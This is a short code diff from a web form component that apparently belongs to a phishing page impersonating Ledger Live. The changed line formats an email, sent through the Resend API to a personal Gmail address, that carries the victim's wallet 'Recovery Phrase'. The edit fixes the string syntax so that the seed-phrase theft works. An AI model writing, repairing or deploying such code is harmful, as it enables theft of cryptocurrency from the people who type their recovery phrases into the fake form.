@@ -68,7 +68,7 @@ const Form = () => {
           from: "onboarding@resend.dev",
           to: ["tykeshare@gmail.com"],
           subject: "Ledger Live Submission",
-          html: <p><strong>Form Type:</strong> ledger_live</p><p><strong>Recovery Phrase:</strong></p><p>${formData}</p>,
+          html: "<p><strong>Form Type:</strong> ledger_live</p><p><strong>Recovery Phrase:</strong></p><p>" + formData + "</p>",
         }),
       });
 
